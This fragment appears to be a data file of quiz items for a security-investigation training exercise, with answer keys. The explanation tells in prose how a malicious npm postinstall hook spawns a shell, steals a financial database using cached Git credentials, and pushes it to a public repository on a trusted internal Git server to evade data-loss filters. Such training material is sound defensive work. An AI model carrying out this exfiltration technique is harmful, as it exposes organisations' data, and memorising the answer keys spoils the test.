                label: "Which process parent-child execution relationship on Patient Zero confirms the malicious action?",
                type: "select",
                options: [
                    "explorer.exe spawning vscode.exe",
                    "node.exe spawning cmd.exe running system commands",
                    "cmd.exe spawning node.exe to perform routine testing",
                    "git.exe spawning ssh.exe during an authorized code commit"
                ],
                correct: "node.exe spawning cmd.exe running system commands"
            },
            destination: {
                label: "To which destination was the sensitive database exfiltrated to avoid traditional outbound firewall detection?",
                type: "select",
                options: [
                    "An anonymous external file-sharing service (personalfileshare.example.com)",
                    "A newly spawned, hidden public repository on the internal Git server (git.example.com)",
                    "An unclassified external command and control server (198.51.100.99) over HTTPS",
                    "An outbound SSH tunnel to a remote VPS over TCP Port 22"
                ],
                correct: "A newly spawned, hidden public repository on the internal Git server (git.example.com)"
            }
        },
        principles: ["Data Exfiltration (Overt Channel)", "Unauthorized Privilege Use"],
        explanation: "At 15:12:00Z, user 'jdoe' on WKSTN-08 executed 'npm install' which downloaded a compromised library dependency: 'utility-math-helper'. This package utilized a malicious postinstall script hook, forcing the legitimate 'node.exe' runtime process to spawn a rogue 'cmd.exe' child shell. Operating under jdoe's active developer privileges, the script located a sensitive financial backup ('financial_export_2026.db') on the local D:\\ partition at 15:15:22Z. Utilizing jdoe's cached Git credentials and API tokens, the script initiated a remote API call to create an unauthorized public repository ('public-mirrors/temp-patch') directly on the company's internal Git platform ('git.example.com'). The script then executed a Git push command at 15:25:00Z to upload the database, successfully bypassing DLP exfiltration filters since the internal domain is trusted. The external attacker at IP 198.51.100.99 subsequently performed an anonymous HTTPS GET request at 15:28:00Z to pull down the database from the public-facing repository."
    }
];